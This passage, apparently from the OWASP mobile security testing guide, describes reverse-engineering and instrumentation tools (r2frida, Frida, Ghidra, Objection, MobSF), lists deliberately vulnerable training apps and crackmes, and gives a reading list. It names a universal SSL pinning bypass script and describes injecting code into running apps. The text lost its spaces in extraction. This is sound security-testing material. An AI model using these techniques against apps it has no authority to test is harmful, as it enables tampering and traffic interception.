"size":12,"flag":"hit14_2","content":"unacceptableSearching12bytes:756e61 \ 636365707461"},{"address":"0x561f072c42c8","size":12,"flag":"hit14_3",\ "content":"unacceptableSearching12bytes:756e61636365707461"}, ... To list the loaded libraries use the command :il and filter the results using the internal grep from radare2 with the command~. Forexample,thefollowingcommandwilllisttheloadedlibrariesmatchingthekeywordskeystore,ssland crypto: [0x00000000]>:il~keystore,ssl,crypto 0x00007f3357b8e000libssl.so.1.1 0x00007f3357716000libcrypto.so.1.1 Similarly,tolisttheexportsandfiltertheresultsbyaspecifickeyword: 561\n[0x00000000]>:iElibssl.so.1.1~CIPHER 0x7f3357bb7ef0fSSL_CIPHER_get_bits 0x7f3357bb8260fSSL_CIPHER_find 0x7f3357bb82c0fSSL_CIPHER_get_digest_nid 0x7f3357bb8380fSSL_CIPHER_is_aead 0x7f3357bb8270fSSL_CIPHER_get_cipher_nid 0x7f3357bb7ed0fSSL_CIPHER_get_name 0x7f3357bb8340fSSL_CIPHER_get_auth_nid 0x7f3357bb7930fSSL_CIPHER_description 0x7f3357bb8300fSSL_CIPHER_get_kx_nid 0x7f3357bb7ea0fSSL_CIPHER_get_version 0x7f3357bb7f10fSSL_CIPHER_get_id Tolistorsetabreakpointusethecommanddb. Thisisusefulwhenanalyzing/modifyingmemory: [0x00000000]>:db Finally,rememberthatyoucanalsorunFridaJavaScriptcodewith\. plusthenameofthescript: [0x00000000]>\.agent.js Youcanfindmoreexamplesonhowtouser2fridaontheirWikiproject. Frida Platform: generic Availableat: https://github.com/frida/frida FridaisafreeandopensourcedynamiccodeinstrumentationtoolkitwrittenbyOleAndréVadlaRavnåsthatworksby injectingtheQuickJSJavaScriptengine(previouslyDuktapeandV8)intotheinstrumentedprocess. Fridaletsyouexecute snippetsofJavaScriptintonativeappsonAndroidandiOS(aswellasonotherplatforms). ToinstallFridalocally,simplyrun: pipinstallfrida-tools Orrefertotheinstallationpageformoredetails. Codecanbeinjectedinseveralways. Forexample,XposedpermanentlymodifiestheAndroidapploader,providinghooks forrunningyourowncodeeverytimeanewprocessisstarted. Incontrast,Fridaimplementscodeinjectionbywriting codedirectlyintotheprocessmemory. Whenattachedtoarunningapp: • Fridausesptracetohijackathreadofarunningprocess. Thisthreadisusedtoallocateachunkofmemoryand populateitwithamini-bootstrapper. • Thebootstrapperstartsafreshthread, connectstotheFridadebuggingserverthat’srunningonthedevice, and loadsasharedlibrarythatcontainstheFridaagent(frida-agent.so). • Theagentestablishesabi-directionalcommunicationchannelbacktothetool(e.g.theFridaREPLoryourcustom Pythonscript). • Thehijackedthreadresumesafterbeingrestoredtoitsoriginalstate,andprocessexecutioncontinuesasusual. 562\n• FridaArchitecture,source: https://www.frida.re/docs/hacking/ Fridaoffersthreemodesofoperation: 1. Injected: thisisthemostcommonscenariowhenfrida-serverisrunningasadaemonintheiOSorAndroiddevice. frida-core is exposed over TCP, listening on localhost:27042 by default. Running in this mode is not possible on devicesthatarenotrootedorjailbroken. 2. Embedded: thisisthecasewhenyourdeviceisnotrootednorjailbroken(youcannotuseptraceasanunprivileged user),you’reresponsiblefortheinjectionofthefrida-gadgetlibrarybyembeddingitintoyourapp,manuallyorvia third-partytoolssuchasObjection. 3. Preloaded: similar to LD_PRELOAD or DYLD_INSERT_LIBRARIES. You can configure the frida-gadget to run autonomouslyandloadascriptfromthefilesystem(e.g.pathrelativetowheretheGadgetbinaryresides). Independently of the chosen mode, you can make use of the Frida JavaScript APIs to interact with the running process anditsmemory. SomeofthefundamentalAPIsare: • Interceptor: WhenusingtheInterceptorAPI,Fridainjectsatrampoline(akain-linehooking)atthefunctionprologue whichprovokesaredirectiontoourcustomcode,executesourcode,andreturnstotheoriginalfunction. Notethat whileveryeffectiveforourpurpose,thisintroducesaconsiderableoverhead(duetothetrampolinerelatedjumping andcontextswitching)andcannotbeconsideredtransparentasitoverwritestheoriginalcodeandactssimilarto a debugger (putting breakpoints) and therefore can be detected in a similar manner, e.g. by applications that periodicallychecksumtheirowncode. • Stalker: If your tracing requirements include transparency, performance and high granularity, Stalker should be yourAPIofchoice. WhentracingcodewiththeStalkerAPI,Fridaleveragesjust-in-timedynamicrecompilation(by usingCapstone): whenathreadisabouttoexecuteitsnextinstructions,Stalkerallocatessomememory,copies the original code over, and interlaces the copy with your custom code for instrumentation. Finally, it executes thecopy(leavingtheoriginalcodeuntouched,andthereforeavoidinganyanti-debuggingchecks). Thisapproach 563\nincreases instrumentation performance considerably and allows for very high granularity when tracing (e.g. by tracingexclusivelyCALLorRETinstructions). Youcanlearnmorein-depthdetailsintheblogpost“Anatomyofa codetracer”byFrida’screatorOle[#vadla]. SomeexamplesofuseforStalkerare,forexamplewho-does-it-callor diff-calls. • Java: WhenworkingonAndroidyoucanusethisAPItoenumerateloadedclasses,enumerateclassloaders,create andusespecificclassinstances,enumerateliveinstancesofclassesbyscanningtheheap,etc. • ObjC:WhenworkingoniOSyoucanusethisAPItogetamappingofallregisteredclasses,registerorusespecific classorprotocolinstances,enumerateliveinstancesofclassesbyscanningtheheap,etc. Frida also provides a couple of simple tools built on top of the Frida API and available right from your terminal after installingfrida-toolsviapip. Forinstance: • YoucanusetheFridaCLI(frida)forquickscriptprototypingandtry/errorscenarios. • frida-pstoobtainalistofallapps(orprocesses)runningonthedeviceincludingtheirnames,identifiersandPIDs. • frida-ls-devicestolistyourconnecteddevicesrunningFridaserversoragents. • frida-tracetoquicklytracemethodsthatarepartofaniOSapporthatareimplementedinsideanAndroidnative library. Inaddition,you’llalsofindseveralopensourceFrida-basedtools,suchas: • Grapefruit: aRuntimeApplicationInstrumenttoolkigforiOS. • Fridump: amemorydumpingtoolforbothAndroidandiOS. • Objection: aruntimemobilesecurityassessmentframework. • r2frida: aprojectmergingthepowerfulreverseengineeringcapabilitiesofradare2withthedynamicinstrumenta- tiontoolkitofFrida. • jnitrace: atoolfortracingusageoftheAndroidJNIruntimemethodsbyanativelibrary. Wewillbeusingallofthesetoolsthroughouttheguide. Youcanusethesetoolsas-is,tweakthemtoyourneeds,ortakeasexcellentexamplesonhowtousetheAPIs. Having them as an example is very helpful when you write your own hooking scripts or when you build introspection tools to supportyourreverseengineeringworkflow. Frida CodeShare Platform: generic Availableat: https://codeshare.frida.re/ Frida CodeShare is a repository containing a collection of ready-to-run Frida scripts which can enormously help when performingconcretetasksbothonAndroidasoniOSaswellasalsoserveasinspirationtobuildyourownscripts. Two representativeexamplesare: • Universal Android SSL Pinning Bypass with Frida - https://codeshare.frida.re/@pcipolloni/universal-android-ssl- pinning-bypass-with-frida/ • ObjCmethodobserver-https://codeshare.frida.re/@mrmacete/objc-method-observer/ Usingthemisassimpleasincludingthe--codeshare<handler>flagandahandlerwhenusingtheFridaCLI.Forexample, touse“ObjCmethodobserver”,enterthefollowing: frida --codeshare mrmacete/objc-method-observer -fYOUR_BINARY LIEF Platform: generic Availableat: https://github.com/lief-project/LIEF ThepurposeofLIEFistoprovideacrossplatformlibrarytoparse,modifyandabstractELF,PEandMachOformats. With ityoucan,forinstance,injectacertainlibraryasadependencyofanativelibrary,whichanapplicationalreadyloadsby default. -https://lief.quarkslab.com/ 564\nGhidra Platform: generic Availableat: https://github.com/NationalSecurityAgency/ghidra Ghidraisanopensourcesoftwarereverseengineering(SRE)suiteoftoolsdevelopedbytheUnitedStateofAmerica’s National Security Agency’s (NSA) Research Directorate. Ghidra is a versatile tool which comprises of a disassembler, decompilerandabuilt-inscriptingengineforadvancedusage. Pleaserefertotheinstallationguideonhowtoinstallit andalsolookatthecheatsheetforafirstoverviewofavailablecommandsandshortcuts. Inthissection,wewillhave walk-throughonhowtocreateaproject,viewdisassemblyanddecompiledcodeforabinary. StartGhidrausingghidraRun(*nix)orghidraRun.bat(Windows),dependingontheplatformyouareon. OnceGhidrais firedup,createanewprojectbyspecifyingtheprojectdirectory. Youwillbegreetedbyawindowasshownbelow: In your new Active Project you can import an app binary by going to File -> Import File and choosing the desired file. 565\nIfthefilecanbeproperlyprocessed,Ghidrawillshowmeta-informationaboutthebinarybeforestartingtheanalysis. To get the disassembled code for the binary file chosen above, double click the imported file from the Active Project 566\nwindow. Clickyesandanalyzeforauto-analysisonthesubsequentwindows. Auto-analysiswilltakesometimedepend- ingonthesizeofthebinary,theprogresscanbetrackedinthebottomrightcornerofthecodebrowserwindow. Once auto-analysisiscompletedyoucanstartexploringthebinary. The most important windows to explore a binary in Ghidra are the Listing (Disassembly) window, the Symbol Tree windowandtheDecompilerwindow,whichshowsthedecompiledversionofthefunctionselectedfordisassembly. The DisplayFunctionGraphoptionshowscontrolflowgraphoftheselectedfunction. 567\nTherearemanyotherfunctionalitiesavailableinGhidraandmostofthemcanbeexploredbyopeningtheWindowmenu. Forexample,ifyouwanttoexaminethestringspresentinthebinary,opentheDefinedStringsoption. Wewilldiscuss otheradvancedfunctionalitieswhileanalyzingvariousbinariesforAndroidandiOSplatformsinthecomingchapters. 568\nRMS Runtime Mobile Security Platform: generic Availableat: https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security RMS-RuntimeMobileSecurityisaruntimemobileapplicationanalysistoolkit,supportingAndroidandiOSApps. Itoffers awebGUIandiswritteninPython. It’sleveragingarunningFridaserveronajailbrokendevicewiththefollowingout-of-boxfunctionalities: • ExecutepopularFridascripts • ExecutecustomFridascripts • Dumpalltheloadedclassesandrelativemethods • Hookmethodsonthefly • (Android)MonitorAndroidAPIsandusageofnativeAPIs Theinstallationinstructionsand“how-toguide”ofRMScanbefoundintheReadmeoftheGithubrepo. iaito Platform: generic Availableat: https://github.com/radareorg/iaito Iaitoistheofficialgraphicaluserinterfaceforradare2,anopen-sourcereverseengineeringframework. Thisuser-friendly toolsimplifiesthereverseengineeringprocessbyprovidingagraphicalinterfacethatintegratesseamlesslywithradare2’s powerfulfeatures. Withafocusonsimplicity,keybindings,andradare2-styleworkflows,Iaitoisavaluableresourcefor bothexperiencedreverseengineersandthosenewtothefield,offeringamoreaccessibleandefficientwaytoworkwith radare2. 569\nMobSF Platform: generic Availableat: https://github.com/MobSF/Mobile-Security-Framework-MobSF MobSF(MobileSecurityFramework)isanautomated,all-in-onemobileapplicationpentestingframeworkcapableofper- formingstaticanddynamicanalysis. TheeasiestwayofgettingMobSFstartedisviaDocker. dockerpullopensecurity/mobile-security-framework-mobsf dockerrun -it-p8000:8000opensecurity/mobile-security-framework-mobsf:latest Orinstallandstartitlocallyonyourhostcomputerbyrunning: ##Setup gitclonehttps://github.com/MobSF/Mobile-Security-Framework-MobSF.git cdMobile-Security-Framework-MobSF ./setup.sh #ForLinuxandMac setup.bat #ForWindows ##Installationprocess ./run.sh #ForLinuxandMac run.bat #ForWindows OnceyouhaveMobSFupandrunningyoucanopenitinyourbrowserbynavigatingtohttp://127.0.0.1:8000. Simply dragtheAPKyouwanttoanalyzeintotheuploadareaandMobSFwillstartitsjob. objection Platform: generic Availableat: https://github.com/sensepost/objection Objection is a “runtime mobile exploration toolkit, powered by Frida”. Its main goal is to allow security testing on non- rooteddevicesthroughanintuitiveinterface. ObjectionachievesthisgoalbyprovidingyouwiththetoolstoeasilyinjecttheFridagadgetintoanapplicationbyrepack- agingit. Thisway,youcandeploytherepackagedapptothenon-rooted/non-jailbrokendevicebysideloadingit. Objection alsoprovidesaREPLthatallowsyoutointeractwiththeapplication,givingyoutheabilitytoperformanyactionthatthe applicationcanperform. ObjectioncanbeinstalledthroughpipasdescribedonObjection’sWiki. pip3installobjection 570\nReference applications Theapplicationslistedbelowcanbeusedastrainingmaterials. Note: onlytheMASTGappsandCrackmesaretestedand maintainedbytheMASproject. OVAA Platform: android Availableat: https://github.com/oversecured/ovaa AnAndroidappthataggregatesalltheplatform’sknownandpopularsecurityvulnerabilities. InsecureShop Platform: android Availableat: https://github.com/hax0rgb/InsecureShop/ InsecureShopisanintentionallydesignedAndroidapplicationthatshowcasesvulnerabilities,aimingtoeducatedevelop- ersandsecurityexpertsaboutcommonpitfallswithinmodernAndroidapps. Itservesasadynamicplatformforrefining Androidpentestingskills. The majority of these vulnerabilities can be exploited on non-rooted devices, posing risks from both remote users and malicious third-party applications. Notably, the app doesn’t utilize any APIs. InsecureShop presents an opportunity to explorearangeofvulnerabilities: • HardcodedCredentials: Embeddedlogincredentialswithinthecode. • InsufficientURLValidation: AllowsloadingofarbitraryURLsviaDeeplinks. • ArbitraryCodeExecution: Enablestheexecutionofcodefromthird-partypackages. • AccesstoProtectedComponents: Permitsthird-partyappstolaunchsecurecomponents. • InsecureBroadcastReceiver: RegistrationofabroadcastenablingURLinjection. • InsecureContentProvider: Accessiblecontentproviderputtinguserdataatrisk. Complementingtheselearningexperiences,InsecureShopprovidesdocumentationabouttheimplementedvulnerabilities andtheirassociatedcode. Thisdocumentation,however,refrainsfromofferingcompletesolutionsforeachvulnerability showcasedwithintheInsecureShopapp. AndroGoat Platform: android Availableat: https://github.com/satishpatnayak/AndroGoat Anopensourcevulnerable/insecureapp usingKotlin. This apphas awiderange ofvulnerabilities relatedto certificate pinning, custom URL schemes, Android Network Security Configuration, WebViews, root detection and over 20 other vulnerabilities. Android License Validator Platform: android Availableat: https://mas.owasp.org/crackmes/Android#android-license-validator 571\nThe Android License Validator is a crackme that implements a key validation function in native code, packaged as a standaloneELFexecutableforAndroiddevices. AnalyzingnativecodeisoftenmorechallengingthanJava,whichiswhy criticalbusinesslogicisfrequentlywrittenthisway. Whilethissampleapplicationmaynotrepresentareal-worldscenario,itservesasavaluablelearningtooltograspthe basicsofsymbolicexecution. Theseinsightscanbeappliedinpracticalsituations,especiallywhendealingwithAndroid appsthatincludeobfuscatednativelibraries. Infact,obfuscatedcodeisoftenputintonativelibrariesspecificallytomake theprocessofde-obfuscationmorechallenging. ByBernhardMueller InsecureBankv2 Platform: android Availableat: https://github.com/dineshshetty/Android-InsecureBankv2 A vulnerable Android app made for security enthusiasts and developers to learn the Android insecurities by testing a vulnerableapplication. Ithasbeenupdatedin2018andcontainsalotofvulnerabilities. DodoVulnerableBank Platform: android Availableat: https://github.com/CSPF-Founder/DodoVulnerableBank AninsecureAndroidappfrom2015. Android UnCrackable L3 Platform: android Availableat: https://mas.owasp.org/crackmes/Android#android-uncrackable-l3 Thecrackmefromhell! Asecretstringishiddensomewhereinthisapp. Findawaytoextractit. ByBernhardMueller. SpecialthankstoEduardoNovellafortesting, feedbackandpointingoutflawsintheinitial build(s). Android UnCrackable L1 Platform: android Availableat: https://mas.owasp.org/crackmes/Android#android-uncrackable-l1 Asecretstringishiddensomewhereinthisapp. Findawaytoextractit. ByBernhardMueller MASTG Hacking Playground (Kotlin) Platform: android Availableat: https://github.com/OWASP/MASTG-Hacking-Playground/tree/master/Android/MASTG-Android-Kotlin- App AvulnerableAndroidappbytheOWASPMASproject. 572\nMASTG Hacking Playground (Java) Platform: android Availableat: https://github.com/OWASP/MASTG-Hacking-Playground/tree/master/Android/MASTG-Android-Java- App AvulnerableAndroidappbytheOWASPMASproject. Seeincludedvulnerabilitiesinhere. Digitalbank Platform: android Availableat: https://github.com/CyberScions/Digitalbank Avulnerableappcreatedin2015,whichcanbeusedonolderAndroidplatforms. DIVA Android Platform: android Availableat: https://github.com/payatu/diva-android Anappintentionallydesignedtobeinsecurewhichhasreceivedupdatesin2016andcontains13differentchallenges. DVHMA Platform: android Availableat: https://github.com/logicalhacking/DVHMA Ahybridmobileapp(forAndroid)thatintentionallycontainsvulnerabilities. Android UnCrackable L4 Platform: android Availableat: https://mas.owasp.org/crackmes/Android#android-uncrackable-l4 The Radare2 community always dreamed with its decentralized and free currency to allow r2 fans to make payments in places and transfer money between r2 users. A debug version of the r2Pay app has been developed and it will be supportedverysooninmanystoresandwebsites. Canyouverifythatthisiscryptographicallyunbreakable? Hint: RuntheAPKinanon-tampereddevicetoplayabitwiththeapp. 1. ThereisamasterPINcodethatgeneratesgreentokens(akar2coins)onthescreen. Ifyouseearedr2coin,then thistokenwon’tbevalidatedbythecommunity. Youneedtofindoutthe4digitsPINcodeandthesaltemployed aswell. Flag: r2con{PIN_NUMERIC:SALT_LOWERCASE} 2. Thereisa“r2paymasterkey”buriedinlayersofobfuscationandprotections. Canyoubreakthewhitebox? Flag: r2con{ascii(key)} Versions: • v0.9-ReleaseforOWASPMAS:Sourcecodeisavailableandthecompilationhasbeensoftenedinmanywaysto makethechallengeeasierandmoreenjoyablefornewcomers. • v1.0-ReleaseforR2conCTF2020: Nosourcecodeisavailableandmanyextraprotectionsareinplace. 573\nCreated and maintained by Eduardo Novella & Gautam Arvind. Special thanks to NowSecure for supporting this crackme. Android UnCrackable L2 Platform: android Availableat: https://mas.owasp.org/crackmes/Android#android-uncrackable-l2 Thisappholdsasecretinside. Mayincludetracesofnativecode. By Bernhard Mueller. Special thanks to Michael Helwig for finding and fixing an oversight in the anti-tampering mechanism. DVIA Platform: ios Availableat: http://damnvulnerableiosapp.com/ A vulnerable iOS app written in Objective-C which provides a platform to mobile security enthusiasts/professionals or studentstotesttheiriOSpenetrationtestingskills. DVIA-v2 Platform: ios Availableat: https://github.com/prateek147/DVIA-v2 AvulnerableiOSapp,writteninSwiftwithover15vulnerabilities. 574\nSuggested Reading Mobile App Security Android • DominicChell,TyroneErasmus,ShaunColley,OllieWhitehous(2015)MobileApplicationHacker’sHandbook. Wiley. Availableat: https://www.wiley.com/en-us/The+Mobile+Application+Hacker%27s+Handbook-p-9781118958506 • JoshuaJ.Drake,ZachLanier,CollinMulliner,PauOliva,StephenA.Ridley,GeorgWicherski(2014)AndroidHacker’s Handbook. Wiley. Availableat: https://www.wiley.com/en-us/Android+Hacker%27s+Handbook-p-9781118608647 • GodfreyNolan(2014)BulletproofAndroid. Addison-WesleyProfessional. Availableat: https://www.amazon.com/B ulletproof-Android-Practical-Building-Developers/dp/0133993329 • NikolayElenkov(2014)AndroidSecurityInternals: AnIn-DepthGuidetoAndroid’sSecurityArchitecture. NoStarch Press. Availableat: https://nostarch.com/androidsecurity • JonathanLevin(2015)AndroidInternals:: Aconfectionerscookbook-VolumeI:Thepoweruser’sview. Technolo- geeks.com. Availableat: http://newandroidbook.com/ iOS • Charlie Miller, Dionysus Blazakis, Dino Dai Zovi, Stefan Esser, Vincenzo Iozzo, Ralf-Philipp Weinmann (2012) iOS Hacker’sHandbook. Wiley. Availableat: https://www.wiley.com/en-us/iOS+Hacker%27s+Handbook-p-97811182 04122 • David Thiel (2016) iOS Application Security, The Definitive Guide for Hackers and Developers. no starch press. Availableat: https://www.nostarch.com/iossecurity • JonathanLevin(2017),MacOSXandiOSInternals,Wiley. Availableat: http://newosxbook.com/index.php Reverse Engineering • BruceDang, AlexandreGazet, EliasBackaalany(2014)PracticalReverseEngineering. Wiley. Availableat: https: //www.wiley.com/en-us/Practical+Reverse+Engineering%3A+x86%2C+x64%2C+ARM%2C+Windows+Kernel%2C +Reversing+Tools%2C+and+Obfuscation-p-9781118787311 • Skakenunny,HangcomiOSAppReverseEngineering. Online. Availableat: https://github.com/iosre/iOSAppRever seEngineering/ • BernhardMueller(2016)HackingSoftTokens-AdvancedReverseEngineeringonAndroid. HITBGSECSingapore. Availableat: http://gsec.hitb.org/materials/sg2016/D1%20-%20Bernhard%20Mueller%20-%20Attacking%20Softw are%20Tokens.pdf • DennisYurichev(2016)ReverseEngineeringforBeginners. Online. Availableat: https://beginners.re/ • MichaelHaleLigh,AndrewCase,JamieLevy,AaronWalters(2014)TheArtofMemoryForensics. Wiley. Available at: https://www.wiley.com/en-us/The+Art+of+Memory+Forensics%3A+Detecting+Malware+and+Threats+in+W indows%2C+Linux%2C+and+Mac+Memory-p-9781118825099 • JacobBaines(2016)ProgrammingLinuxAnti-ReversingTechniques. Leanpub. Availableat: https://leanpub.com/ anti-reverse-engineering-linux 575